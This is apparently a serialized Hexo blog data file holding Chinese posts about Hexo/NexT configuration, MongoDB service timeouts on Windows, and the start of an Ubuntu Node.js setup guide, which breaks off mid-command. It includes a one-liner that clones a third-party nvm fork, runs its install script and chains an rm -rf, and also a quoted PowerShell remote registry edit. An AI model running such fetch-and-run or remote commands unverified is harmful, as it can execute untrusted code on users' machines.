###\n可以参考这个链接[如何使用七牛云做为图床？](http://cnfeat.com/blog/2015/11/30/cli-qiniu/#section-7)\n我采用他说的第一种方法，也就是七牛云的上传插件[qiniu upload files](https://chrome.google.com/webstore/detail/qiniu-upload-files/emmfkgdgapbjphdolealbojmcmnphdcc)，遇到了一个小障碍，就是在填写配置表格的时候，这个域名:\n![hexo/qiniu](http://o798x2hdw.bkt.clouddn.com/hexo_qiniu.png)\n不是你博客的域名，而是七牛生成的外链的域名，在七牛云----->marys存储空间(marys是我的存储空间名字)---->内容管理，里面可以看到你通过插件上传的图片，那个外链默认域名才是你需要填进去的域名，通过操作->复制外链可以直接复制：\n![hexo/qiniu](http://o798x2hdw.bkt.clouddn.com/setdomain.png)\nkeyword:七牛云 图床 图片404 上传插件\n### 4. 修改头像 ###\n进去themes/next/_config.yml，搜索avatar，去掉#注释，avatar: 后接你的头像图片URL。头像图片放next主题下的images文件夹，url就写成/images/avatar.jpg\n\n## 4、markdown标题不解析 ##\n解析出来后，标题的#号仍然显示，并且标题没有加粗等这些格式：\nmarkdown标题标准写法需要在\"#\"和后面字符之间加一个空格，如果不加空格，有些引擎就解析不了\n\n## 5、百度统计 ##\n直接甩链接系列：[NexT主题文档之百度统计](http://theme-next.iissnan.com/getting-started.html#analysis-system-baidu)\n## 6、评论 ##\n评论可以用多说评论框，但是用了多说评论框，你的文章就会自动被扒走，然后放到推酷这个网站上，你还啥都不知道（囧不懂脸）。所以我用的是国外的disqus，直接甩链接系列:\n\n1. [告别多说，拥抱 Disqus](https://blog.jamespan.me/2015/04/18/goodbye-duoshuo/)\n2. [解決 Hexo Comment !](http://morris821028.github.io/2014/04/12/web/hexo-comment/)\n\n## 7、文章阅读量 ##\n\n直接甩链接系列：[NexT主题文档之阅读次数统计（LeanCloud) ](http://theme-next.iissnan.com/getting-started.html#leanclound-page-views)\n\n## 8、Rss ##\n1. 安装生成插件\n`npm install hexo-generator-feed --save`\n2. 修改配置文件，在hexo根目录下的_config.yml中添加以下内容：\n```\nfeed:\n  type: atom\n  path: atom.xml\n  limit: 20\n  hub:\n```\n3. 修改主题配置文件_config.yml，添加以下内容，以在页面中显示rss按钮：\n`rss: /atom.xml`\n---\n参考链接：\n\n1. [Hexo的next主题变成德语](http://www.zhihu.com/question/41625825)\n2. [Hexo文章无法折叠？](http://www.zhihu.com/question/40674614)\n3. [Hexo官方文档-资源文件夹](https://hexo.io/zh-cn/docs/asset-folders.html)\n4. [在Hexo中无痛使用本地图片](http://www.tuicool.com/articles/umEBVfI)\n5. [hexo博客 markdown解析不了标题](http://www.thinksaas.cn/ask/question/22799/)\n6. [你还敢用“多说评论框”吗？](http://tieba.baidu.com/p/1683464316)","slug":"Obstacles_I_Met_When_Using_Hexo","published":1,"updated":"2018-05-07T10:29:59.527Z","layout":"post","photos":[],"link":"","_id":"cjgw4444t00088d95cjwutu9g","content":"<p>之前就装好了Hexo，但仍有好多未完成的部分，所有的细节堆起来就是一个大工程啦，记录一下坑坑们，那都是我逝去的青春π__π<br><a id=\"more\"></a></p>\n<h2 id=\"1、语言\"><a href=\"#1、语言\" class=\"headerlink\" title=\"1、语言\"></a>1、语言</h2><p>Hexo语言设置在hexo项目根文件夹下的_config.yml中配置，找到language，不是chinese，不是zh-CN，我之前设置为zh-CN，会导致语言变为德文，文章标题下面的时间戳前面会变成“Veröffentlicht am”，要设为<br><code>language: zh-Hans</code><br>如果设置之后还不起作用，请到theme/next/languages/目录下查看是否有zh-Hans.yml（zh-EN.yml)文件，如果没有，请直接到next的Github下载相应文件添加即可。</p>\n<h2 id=\"2、文章折叠\"><a href=\"#2、文章折叠\" class=\"headerlink\" title=\"2、文章折叠\"></a>2、文章折叠</h2><p>按照一般的Hexo教程进行安装，安装好后，首页文章没有折叠起来，全部是默认打开的，而我们希望每篇文章只显示部分内容，用户点击more的时候，再展开到详情页面。要做到这样，只需在.md文章里，在需要截取那段展示出来文字的地方添加 <code>&lt;!-- More --&gt;</code>，这样后面的文字都默认不显示，并出现一个More按钮<br>更详细的说明，可以看这个<a href=\"http://www.zhihu.com/question/40674614\" title=\"hexo 文章无法折叠？\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<h2 id=\"3、图片以及头像\"><a href=\"#3、图片以及头像\" class=\"headerlink\" title=\"3、图片以及头像\"></a>3、图片以及头像</h2><p>github page页的容量限制是300M，如果图片比较少，可以放在本地路径，我现在就是。<br>使用方法：<br>（注意下面1和2不可混用，用1就要卸载2的插件，用2就不要用1的语法，别问我怎么知道的）</p>\n<h3 id=\"1-Hexo官方插入图片方法\"><a href=\"#1-Hexo官方插入图片方法\" class=\"headerlink\" title=\"1. Hexo官方插入图片方法\"></a>1. Hexo官方插入图片方法</h3><ol>\n<li>config.yml 文件中的 post_asset_folder 选项设为 true</li>\n<li>Hexo将会在你通过 hexo new [layout] <title> 命令创建新文章时自动创建一个文件夹，这个资源文件夹将会有与这个 markdown 文件一样的名字，然后你就可以使用相对路径来引用图片了</title></li>\n<li>当你打开文章资源文件夹功能后，你把一个 example.jpg 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法 <code>![](/example.jpg)</code> ，它将不会出现在首页上。（但是它会在文章中按你期待的方式工作）<br>正确的引用图片方式是使用下列的标签插件而不是 markdown ：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% asset_img example.jpg This is an example image %&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"2-使用hexo-asset-image插件插入图片\"><a href=\"#2-使用hexo-asset-image插件插入图片\" class=\"headerlink\" title=\"2. 使用hexo-asset-image插件插入图片\"></a>2. 使用hexo-asset-image插件插入图片</h3><ol>\n<li>首先确认 _config.yml 中有 post_asset_folder:true 。</li>\n<li>在 hexo 目录，执行<br><code>npm install https://github.com/CodeFalling/hexo-asset-image --save</code><br>假设在<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MacGesture2-Publish</span><br><span class=\"line\">├── apppicker.jpg</span><br><span class=\"line\">├── logo.jpg</span><br><span class=\"line\">└── rules.jpg</span><br><span class=\"line\">MacGesture2-Publish.md</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>这样的目录结构（目录名和文章名一致），只要使用 <code>![logo](MacGesture2-Publish/logo.jpg)</code>就可以插入图片。</p>\n<h3 id=\"3-使用千牛做图床\"><a href=\"#3-使用千牛做图床\" class=\"headerlink\" title=\"3. 使用千牛做图床\"></a>3. 使用千牛做图床</h3><p>可以参考这个链接<a href=\"http://cnfeat.com/blog/2015/11/30/cli-qiniu/#section-7\" target=\"_blank\" rel=\"noopener\">如何使用七牛云做为图床？</a><br>我采用他说的第一种方法，也就是七牛云的上传插件<a href=\"https://chrome.google.com/webstore/detail/qiniu-upload-files/emmfkgdgapbjphdolealbojmcmnphdcc\" target=\"_blank\" rel=\"noopener\">qiniu upload files</a>，遇到了一个小障碍，就是在填写配置表格的时候，这个域名:<br><img src=\"http://o798x2hdw.bkt.clouddn.com/hexo_qiniu.png\" alt=\"hexo/qiniu\"><br>不是你博客的域名，而是七牛生成的外链的域名，在七牛云—–&gt;marys存储空间(marys是我的存储空间名字)—-&gt;内容管理，里面可以看到你通过插件上传的图片，那个外链默认域名才是你需要填进去的域名，通过操作-&gt;复制外链可以直接复制：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/setdomain.png\" alt=\"hexo/qiniu\"><br>keyword:七牛云 图床 图片404 上传插件</p>\n<h3 id=\"4-修改头像\"><a href=\"#4-修改头像\" class=\"headerlink\" title=\"4. 修改头像\"></a>4. 修改头像</h3><p>进去themes/next/_config.yml，搜索avatar，去掉#注释，avatar: 后接你的头像图片URL。头像图片放next主题下的images文件夹，url就写成/images/avatar.jpg</p>\n<h2 id=\"4、markdown标题不解析\"><a href=\"#4、markdown标题不解析\" class=\"headerlink\" title=\"4、markdown标题不解析\"></a>4、markdown标题不解析</h2><p>解析出来后，标题的#号仍然显示，并且标题没有加粗等这些格式：<br>markdown标题标准写法需要在”#”和后面字符之间加一个空格，如果不加空格，有些引擎就解析不了</p>\n<h2 id=\"5、百度统计\"><a href=\"#5、百度统计\" class=\"headerlink\" title=\"5、百度统计\"></a>5、百度统计</h2><p>直接甩链接系列：<a href=\"http://theme-next.iissnan.com/getting-started.html#analysis-system-baidu\" target=\"_blank\" rel=\"noopener\">NexT主题文档之百度统计</a></p>\n<h2 id=\"6、评论\"><a href=\"#6、评论\" class=\"headerlink\" title=\"6、评论\"></a>6、评论</h2><p>评论可以用多说评论框，但是用了多说评论框，你的文章就会自动被扒走，然后放到推酷这个网站上，你还啥都不知道（囧不懂脸）。所以我用的是国外的disqus，直接甩链接系列:</p>\n<ol>\n<li><a href=\"https://blog.jamespan.me/2015/04/18/goodbye-duoshuo/\" target=\"_blank\" rel=\"noopener\">告别多说，拥抱 Disqus</a></li>\n<li><a href=\"http://morris821028.github.io/2014/04/12/web/hexo-comment/\" target=\"_blank\" rel=\"noopener\">解決 Hexo Comment !</a></li>\n</ol>\n<h2 id=\"7、文章阅读量\"><a href=\"#7、文章阅读量\" class=\"headerlink\" title=\"7、文章阅读量\"></a>7、文章阅读量</h2><p>直接甩链接系列：<a href=\"http://theme-next.iissnan.com/getting-started.html#leanclound-page-views\" target=\"_blank\" rel=\"noopener\">NexT主题文档之阅读次数统计（LeanCloud) </a></p>\n<h2 id=\"8、Rss\"><a href=\"#8、Rss\" class=\"headerlink\" title=\"8、Rss\"></a>8、Rss</h2><ol>\n<li>安装生成插件<br><code>npm install hexo-generator-feed --save</code></li>\n<li><p>修改配置文件，在hexo根目录下的_config.yml中添加以下内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">feed:</span><br><span class=\"line\">  type: atom</span><br><span class=\"line\">  path: atom.xml</span><br><span class=\"line\">  limit: 20</span><br><span class=\"line\">  hub:</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>修改主题配置文件_config.yml，添加以下内容，以在页面中显示rss按钮：<br><code>rss: /atom.xml</code></p>\n</li>\n</ol>\n<hr>\n<p>参考链接：</p>\n<ol>\n<li><a href=\"http://www.zhihu.com/question/41625825\" target=\"_blank\" rel=\"noopener\">Hexo的next主题变成德语</a></li>\n<li><a href=\"http://www.zhihu.com/question/40674614\" target=\"_blank\" rel=\"noopener\">Hexo文章无法折叠？</a></li>\n<li><a href=\"https://hexo.io/zh-cn/docs/asset-folders.html\" target=\"_blank\" rel=\"noopener\">Hexo官方文档-资源文件夹</a></li>\n<li><a href=\"http://www.tuicool.com/articles/umEBVfI\" target=\"_blank\" rel=\"noopener\">在Hexo中无痛使用本地图片</a></li>\n<li><a href=\"http://www.thinksaas.cn/ask/question/22799/\" target=\"_blank\" rel=\"noopener\">hexo博客 markdown解析不了标题</a></li>\n<li><a href=\"http://tieba.baidu.com/p/1683464316\" target=\"_blank\" rel=\"noopener\">你还敢用“多说评论框”吗？</a></li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>之前就装好了Hexo，但仍有好多未完成的部分，所有的细节堆起来就是一个大工程啦，记录一下坑坑们，那都是我逝去的青春π__π<br></p>","more":"<p></p>\n<h2 id=\"1、语言\"><a href=\"#1、语言\" class=\"headerlink\" title=\"1、语言\"></a>1、语言</h2><p>Hexo语言设置在hexo项目根文件夹下的_config.yml中配置，找到language，不是chinese，不是zh-CN，我之前设置为zh-CN，会导致语言变为德文，文章标题下面的时间戳前面会变成“Veröffentlicht am”，要设为<br><code>language: zh-Hans</code><br>如果设置之后还不起作用，请到theme/next/languages/目录下查看是否有zh-Hans.yml（zh-EN.yml)文件，如果没有，请直接到next的Github下载相应文件添加即可。</p>\n<h2 id=\"2、文章折叠\"><a href=\"#2、文章折叠\" class=\"headerlink\" title=\"2、文章折叠\"></a>2、文章折叠</h2><p>按照一般的Hexo教程进行安装，安装好后，首页文章没有折叠起来，全部是默认打开的，而我们希望每篇文章只显示部分内容，用户点击more的时候，再展开到详情页面。要做到这样，只需在.md文章里，在需要截取那段展示出来文字的地方添加 <code>&lt;!-- More --&gt;</code>，这样后面的文字都默认不显示，并出现一个More按钮<br>更详细的说明，可以看这个<a href=\"http://www.zhihu.com/question/40674614\" title=\"hexo 文章无法折叠？\" target=\"_blank\" rel=\"noopener\">链接</a></p>\n<h2 id=\"3、图片以及头像\"><a href=\"#3、图片以及头像\" class=\"headerlink\" title=\"3、图片以及头像\"></a>3、图片以及头像</h2><p>github page页的容量限制是300M，如果图片比较少，可以放在本地路径，我现在就是。<br>使用方法：<br>（注意下面1和2不可混用，用1就要卸载2的插件，用2就不要用1的语法，别问我怎么知道的）</p>\n<h3 id=\"1-Hexo官方插入图片方法\"><a href=\"#1-Hexo官方插入图片方法\" class=\"headerlink\" title=\"1. Hexo官方插入图片方法\"></a>1. Hexo官方插入图片方法</h3><ol>\n<li>config.yml 文件中的 post_asset_folder 选项设为 true</li>\n<li>Hexo将会在你通过 hexo new [layout] <title> 命令创建新文章时自动创建一个文件夹，这个资源文件夹将会有与这个 markdown 文件一样的名字，然后你就可以使用相对路径来引用图片了</title></li>\n<li>当你打开文章资源文件夹功能后，你把一个 example.jpg 图片放在了你的资源文件夹中，如果通过使用相对路径的常规 markdown 语法 <code>![](/example.jpg)</code> ，它将不会出现在首页上。（但是它会在文章中按你期待的方式工作）<br>正确的引用图片方式是使用下列的标签插件而不是 markdown ：<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% asset_img example.jpg This is an example image %&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"2-使用hexo-asset-image插件插入图片\"><a href=\"#2-使用hexo-asset-image插件插入图片\" class=\"headerlink\" title=\"2. 使用hexo-asset-image插件插入图片\"></a>2. 使用hexo-asset-image插件插入图片</h3><ol>\n<li>首先确认 _config.yml 中有 post_asset_folder:true 。</li>\n<li>在 hexo 目录，执行<br><code>npm install https://github.com/CodeFalling/hexo-asset-image --save</code><br>假设在<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MacGesture2-Publish</span><br><span class=\"line\">├── apppicker.jpg</span><br><span class=\"line\">├── logo.jpg</span><br><span class=\"line\">└── rules.jpg</span><br><span class=\"line\">MacGesture2-Publish.md</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>这样的目录结构（目录名和文章名一致），只要使用 <code>![logo](MacGesture2-Publish/logo.jpg)</code>就可以插入图片。</p>\n<h3 id=\"3-使用千牛做图床\"><a href=\"#3-使用千牛做图床\" class=\"headerlink\" title=\"3. 使用千牛做图床\"></a>3. 使用千牛做图床</h3><p>可以参考这个链接<a href=\"http://cnfeat.com/blog/2015/11/30/cli-qiniu/#section-7\" target=\"_blank\" rel=\"noopener\">如何使用七牛云做为图床？</a><br>我采用他说的第一种方法，也就是七牛云的上传插件<a href=\"https://chrome.google.com/webstore/detail/qiniu-upload-files/emmfkgdgapbjphdolealbojmcmnphdcc\" target=\"_blank\" rel=\"noopener\">qiniu upload files</a>，遇到了一个小障碍，就是在填写配置表格的时候，这个域名:<br><img src=\"http://o798x2hdw.bkt.clouddn.com/hexo_qiniu.png\" alt=\"hexo/qiniu\"><br>不是你博客的域名，而是七牛生成的外链的域名，在七牛云—–&gt;marys存储空间(marys是我的存储空间名字)—-&gt;内容管理，里面可以看到你通过插件上传的图片，那个外链默认域名才是你需要填进去的域名，通过操作-&gt;复制外链可以直接复制：<br><img src=\"http://o798x2hdw.bkt.clouddn.com/setdomain.png\" alt=\"hexo/qiniu\"><br>keyword:七牛云 图床 图片404 上传插件</p>\n<h3 id=\"4-修改头像\"><a href=\"#4-修改头像\" class=\"headerlink\" title=\"4. 修改头像\"></a>4. 修改头像</h3><p>进去themes/next/_config.yml，搜索avatar，去掉#注释，avatar: 后接你的头像图片URL。头像图片放next主题下的images文件夹，url就写成/images/avatar.jpg</p>\n<h2 id=\"4、markdown标题不解析\"><a href=\"#4、markdown标题不解析\" class=\"headerlink\" title=\"4、markdown标题不解析\"></a>4、markdown标题不解析</h2><p>解析出来后，标题的#号仍然显示，并且标题没有加粗等这些格式：<br>markdown标题标准写法需要在”#”和后面字符之间加一个空格，如果不加空格，有些引擎就解析不了</p>\n<h2 id=\"5、百度统计\"><a href=\"#5、百度统计\" class=\"headerlink\" title=\"5、百度统计\"></a>5、百度统计</h2><p>直接甩链接系列：<a href=\"http://theme-next.iissnan.com/getting-started.html#analysis-system-baidu\" target=\"_blank\" rel=\"noopener\">NexT主题文档之百度统计</a></p>\n<h2 id=\"6、评论\"><a href=\"#6、评论\" class=\"headerlink\" title=\"6、评论\"></a>6、评论</h2><p>评论可以用多说评论框，但是用了多说评论框，你的文章就会自动被扒走，然后放到推酷这个网站上，你还啥都不知道（囧不懂脸）。所以我用的是国外的disqus，直接甩链接系列:</p>\n<ol>\n<li><a href=\"https://blog.jamespan.me/2015/04/18/goodbye-duoshuo/\" target=\"_blank\" rel=\"noopener\">告别多说，拥抱 Disqus</a></li>\n<li><a href=\"http://morris821028.github.io/2014/04/12/web/hexo-comment/\" target=\"_blank\" rel=\"noopener\">解決 Hexo Comment !</a></li>\n</ol>\n<h2 id=\"7、文章阅读量\"><a href=\"#7、文章阅读量\" class=\"headerlink\" title=\"7、文章阅读量\"></a>7、文章阅读量</h2><p>直接甩链接系列：<a href=\"http://theme-next.iissnan.com/getting-started.html#leanclound-page-views\" target=\"_blank\" rel=\"noopener\">NexT主题文档之阅读次数统计（LeanCloud) </a></p>\n<h2 id=\"8、Rss\"><a href=\"#8、Rss\" class=\"headerlink\" title=\"8、Rss\"></a>8、Rss</h2><ol>\n<li>安装生成插件<br><code>npm install hexo-generator-feed --save</code></li>\n<li><p>修改配置文件，在hexo根目录下的_config.yml中添加以下内容：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">feed:</span><br><span class=\"line\">  type: atom</span><br><span class=\"line\">  path: atom.xml</span><br><span class=\"line\">  limit: 20</span><br><span class=\"line\">  hub:</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>修改主题配置文件_config.yml，添加以下内容，以在页面中显示rss按钮：<br><code>rss: /atom.xml</code></p>\n</li>\n</ol>\n<hr>\n<p>参考链接：</p>\n<ol>\n<li><a href=\"http://www.zhihu.com/question/41625825\" target=\"_blank\" rel=\"noopener\">Hexo的next主题变成德语</a></li>\n<li><a href=\"http://www.zhihu.com/question/40674614\" target=\"_blank\" rel=\"noopener\">Hexo文章无法折叠？</a></li>\n<li><a href=\"https://hexo.io/zh-cn/docs/asset-folders.html\" target=\"_blank\" rel=\"noopener\">Hexo官方文档-资源文件夹</a></li>\n<li><a href=\"http://www.tuicool.com/articles/umEBVfI\" target=\"_blank\" rel=\"noopener\">在Hexo中无痛使用本地图片</a></li>\n<li><a href=\"http://www.thinksaas.cn/ask/question/22799/\" target=\"_blank\" rel=\"noopener\">hexo博客 markdown解析不了标题</a></li>\n<li><a href=\"http://tieba.baidu.com/p/1683464316\" target=\"_blank\" rel=\"noopener\">你还敢用“多说评论框”吗？</a></li>\n</ol>"},{"title":"MongoDB使用过程踩坑小记","date":"2016-06-02T05:30:00.000Z","toc":true,"comments":1,"_content":"\n在windows下使用Mongodb貌似有好多坑，快搞完了才想到要记录下来，于是只记了最后几个坑坑，有的还记得不太清楚，Anyway，能帮助到需要的人就好~ Why so serious？\n<!-- More -->\n一开始报错rc=56，有个插件没装，参考了好多教程，最后按这个[链接](http://www.tuicool.com/articles/ruqU32 'win7 安装 mongodb 绝对正确')装下来比较顺利：\n\n装好以后启动服务时，会出现这个提示：\n```\nHotfix KB2731284 or later update is installed, no need to zero-out data files?\n```\n找到[stackoverflow上一个问题](http://stackoverflow.com/questions/30246428/hotfix-kb2731284-or-later-update-is-installed-no-need-to-zero-out-data-files?s=1|3.2969)，最终指向[这个地址](http://mongodb.2344371.n4.nabble.com/mongod-don-t-start-after-server-crash-td1096.html)\n\n说是windows的服务超时时间太短，修改注册表增加到2min后就可以了，\n这部分没看懂：Here is a snippet of Powershell code that I use to make the edits to all of my MongoDB servers remotely.\n```\nInvoke-Command -ConnectionUri $uri -Credential $localCredentials `\n        -ScriptBlock {set-itemproperty -path HKLM:\\SYSTEM\\CurrentControlSet\\Control -name WaitToKillServiceTimeout -value 120000}\n```\n修改注册表： Windows服务的启动超时时间默认是30秒，但这并对对所有服务都有效，有些服务的时间可能超过30秒，这时候需要修改注册表来解决这个问题。注册表项为`HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/ServicesPipeTimeout`,这个值有可能不存在，如果不存在需要添加。类型为DWORD，单位是毫秒。引用自[这里](http://blog.csdn.net/hanyu1980/article/details/2197455)\n\n","source":"_posts/Obstacles_I_Met_When_Using_MongoDB.md","raw":"---\ntitle: MongoDB使用过程踩坑小记\ndate: 2016-6-2 13:30:00\ncategories: NodeJS\ntags: [踩坑,mongoDB,] #文章标签，可空，多标签请用格式，注意:后面有个空格\ntoc: true\ncomments: true\n---\n\n在windows下使用Mongodb貌似有好多坑，快搞完了才想到要记录下来，于是只记了最后几个坑坑，有的还记得不太清楚，Anyway，能帮助到需要的人就好~ Why so serious？\n<!-- More -->\n一开始报错rc=56，有个插件没装，参考了好多教程，最后按这个[链接](http://www.tuicool.com/articles/ruqU32 'win7 安装 mongodb 绝对正确')装下来比较顺利：\n\n装好以后启动服务时，会出现这个提示：\n```\nHotfix KB2731284 or later update is installed, no need to zero-out data files?\n```\n找到[stackoverflow上一个问题](http://stackoverflow.com/questions/30246428/hotfix-kb2731284-or-later-update-is-installed-no-need-to-zero-out-data-files?s=1|3.2969)，最终指向[这个地址](http://mongodb.2344371.n4.nabble.com/mongod-don-t-start-after-server-crash-td1096.html)\n\n说是windows的服务超时时间太短，修改注册表增加到2min后就可以了，\n这部分没看懂：Here is a snippet of Powershell code that I use to make the edits to all of my MongoDB servers remotely.\n```\nInvoke-Command -ConnectionUri $uri -Credential $localCredentials `\n        -ScriptBlock {set-itemproperty -path HKLM:\\SYSTEM\\CurrentControlSet\\Control -name WaitToKillServiceTimeout -value 120000}\n```\n修改注册表： Windows服务的启动超时时间默认是30秒，但这并对对所有服务都有效，有些服务的时间可能超过30秒，这时候需要修改注册表来解决这个问题。注册表项为`HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/ServicesPipeTimeout`,这个值有可能不存在，如果不存在需要添加。类型为DWORD，单位是毫秒。引用自[这里](http://blog.csdn.net/hanyu1980/article/details/2197455)\n\n","slug":"Obstacles_I_Met_When_Using_MongoDB","published":1,"updated":"2018-05-07T10:29:59.527Z","layout":"post","photos":[],"link":"","_id":"cjgw4445700098d95zaf35stn","content":"<p>在windows下使用Mongodb貌似有好多坑，快搞完了才想到要记录下来，于是只记了最后几个坑坑，有的还记得不太清楚，Anyway，能帮助到需要的人就好~ Why so serious？<br><a id=\"more\"></a><br>一开始报错rc=56，有个插件没装，参考了好多教程，最后按这个<a href=\"http://www.tuicool.com/articles/ruqU32\" title=\"win7 安装 mongodb 绝对正确\" target=\"_blank\" rel=\"noopener\">链接</a>装下来比较顺利：</p>\n<p>装好以后启动服务时，会出现这个提示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hotfix KB2731284 or later update is installed, no need to zero-out data files?</span><br></pre></td></tr></table></figure></p>\n<p>找到<a href=\"http://stackoverflow.com/questions/30246428/hotfix-kb2731284-or-later-update-is-installed-no-need-to-zero-out-data-files?s=1|3.2969\" target=\"_blank\" rel=\"noopener\">stackoverflow上一个问题</a>，最终指向<a href=\"http://mongodb.2344371.n4.nabble.com/mongod-don-t-start-after-server-crash-td1096.html\" target=\"_blank\" rel=\"noopener\">这个地址</a></p>\n<p>说是windows的服务超时时间太短，修改注册表增加到2min后就可以了，<br>这部分没看懂：Here is a snippet of Powershell code that I use to make the edits to all of my MongoDB servers remotely.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Invoke-Command -ConnectionUri $uri -Credential $localCredentials `</span><br><span class=\"line\">        -ScriptBlock &#123;set-itemproperty -path HKLM:\\SYSTEM\\CurrentControlSet\\Control -name WaitToKillServiceTimeout -value 120000&#125;</span><br></pre></td></tr></table></figure></p>\n<p>修改注册表： Windows服务的启动超时时间默认是30秒，但这并对对所有服务都有效，有些服务的时间可能超过30秒，这时候需要修改注册表来解决这个问题。注册表项为<code>HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/ServicesPipeTimeout</code>,这个值有可能不存在，如果不存在需要添加。类型为DWORD，单位是毫秒。引用自<a href=\"http://blog.csdn.net/hanyu1980/article/details/2197455\" target=\"_blank\" rel=\"noopener\">这里</a></p>\n","site":{"data":{}},"excerpt":"<p>在windows下使用Mongodb貌似有好多坑，快搞完了才想到要记录下来，于是只记了最后几个坑坑，有的还记得不太清楚，Anyway，能帮助到需要的人就好~ Why so serious？<br></p>","more":"<br>一开始报错rc=56，有个插件没装，参考了好多教程，最后按这个<a href=\"http://www.tuicool.com/articles/ruqU32\" title=\"win7 安装 mongodb 绝对正确\" target=\"_blank\" rel=\"noopener\">链接</a>装下来比较顺利：<p></p>\n<p>装好以后启动服务时，会出现这个提示：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Hotfix KB2731284 or later update is installed, no need to zero-out data files?</span><br></pre></td></tr></table></figure></p>\n<p>找到<a href=\"http://stackoverflow.com/questions/30246428/hotfix-kb2731284-or-later-update-is-installed-no-need-to-zero-out-data-files?s=1|3.2969\" target=\"_blank\" rel=\"noopener\">stackoverflow上一个问题</a>，最终指向<a href=\"http://mongodb.2344371.n4.nabble.com/mongod-don-t-start-after-server-crash-td1096.html\" target=\"_blank\" rel=\"noopener\">这个地址</a></p>\n<p>说是windows的服务超时时间太短，修改注册表增加到2min后就可以了，<br>这部分没看懂：Here is a snippet of Powershell code that I use to make the edits to all of my MongoDB servers remotely.<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Invoke-Command -ConnectionUri $uri -Credential $localCredentials `</span><br><span class=\"line\">        -ScriptBlock &#123;set-itemproperty -path HKLM:\\SYSTEM\\CurrentControlSet\\Control -name WaitToKillServiceTimeout -value 120000&#125;</span><br></pre></td></tr></table></figure></p>\n<p>修改注册表： Windows服务的启动超时时间默认是30秒，但这并对对所有服务都有效，有些服务的时间可能超过30秒，这时候需要修改注册表来解决这个问题。注册表项为<code>HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/ServicesPipeTimeout</code>,这个值有可能不存在，如果不存在需要添加。类型为DWORD，单位是毫秒。引用自<a href=\"http://blog.csdn.net/hanyu1980/article/details/2197455\" target=\"_blank\" rel=\"noopener\">这里</a></p>"},{"title":"使用Node.js搭建简单Web服务器","date":"2016-10-21T16:30:00.000Z","toc":true,"comments":1,"_content":"摘要：\n1. Ubuntu下Node.js和Express安装\n2. 搭建简单Web服务器\n\n<!-- more -->\n\n> by MaryTien from  [http://supermaryy.com](http://luckymona.github.com)\n> 本文地址：[developing-a-simple-web-server-with-node-js](http://supermaryy.com/2016/10/22/developing-a-simple-web-server-with-node-js/)\n \n# 一、环境搭建：Ubuntu下node和express安装 #\n第一次玩ubuntu加上公司网络比较弱鸡限制了好多网站，node官网上的安装包下载不了，一开始装node还费了老大劲，连滚带爬装上了node，现在总结一下怎么安装的，不然以后用到还得重新摸索。如有错漏，欢迎批评。\n\n## 1. Node安装 ##\n### 1.1关于node版本 ###\nnode查看版本使用命令node –v，我装上后查看显示是0.10.x的版本，但是官网上的都是4.x.x和6.x.x的版本了，很明显这应该使用的不同的版本管理体系。查到二者区别说：0.x.x是Joyent公司维护.进展缓慢，但是稳定；4.,5.*都是由网友维护的，相对的进展快，增加和许多新功能，io.js也是指的这个开源版本。偶数开头的是稳定版，奇数开头的开发版就是会不断变化更新，为下一个稳定版本做测试差不多的意思^1。关于node.js和io.js背后还有一段精彩的故事^2。\n### 1.2Ubuntu安装node：### \n#### 1.2.1tar.gz安装 ####\n^3到node官网上下载安装包，Ubuntu上需要使用.tar.gz结尾的文件进行安装，下载到后，假设放在主文件夹,文件名是name.tar.gz\n快捷键ctrl+alt+t打开终端，`tar -zxvf name.tar.gz`进行解压，假设解压为name文件夹:\n```\ncd name\nsudo make\nsudo make install\n```\n等待安装完成即可\n#### 1.2.2使用nvm管理安装的node版本 ####\n先安装nvm：\n`git clone https://github.com/chenxizhang/nvm.git && ./nvm/install.sh && . ~/.nvm/nvm.sh  && rm –rf 